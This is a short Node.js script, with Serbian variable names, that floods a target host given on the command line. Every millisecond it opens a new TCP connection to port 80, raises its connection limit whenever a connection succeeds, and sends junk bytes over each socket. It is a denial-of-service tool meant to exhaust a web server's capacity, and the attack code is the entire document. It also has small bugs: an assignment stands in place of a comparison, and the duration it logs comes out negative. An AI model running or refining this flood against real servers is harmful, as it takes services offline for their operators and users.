let maxConnections=1;
let targetHost=process.argv[2];
let konekcije=[];
let maxedOut=false;
const net=require('net');

function PoveziSe(host,port) {
	this.klijent=net.connect({host:host,port:port},()=>{
		console.log("Povezan korisnik "+konekcije.length+" OD "+maxConnections);
	});
	this.klijent.on('connect',()=>{
		if(!maxedOut)maxConnections+=1;
		this.vremeKonekcije=new Date();
	});
	this.klijent.on("error",(error)=>{
		if(error.code="ECONNREFUSED") {
            konekcije.splice(konekcije.findIndex(elem=>elem==this),1);
        }
	});
	this.klijent.on("end",()=>
	{
		konekcije.splice(konekcije.findIndex(elem=>elem==this),1);
		console.log("Trajanje konekcije je "+(this.vremeKonekcije.getTime()-new Date().getTime())/1000);
		maxedOut=true;
	});
	this.sendAgain=this.klijent.write("asdasdsadsadsadsadsadasdsad");
}
setInterval(()=> {
		if(maxConnections==0 || konekcije.length<maxConnections)
        konekcije.push(new PoveziSe(targetHost, 80));
    },1);
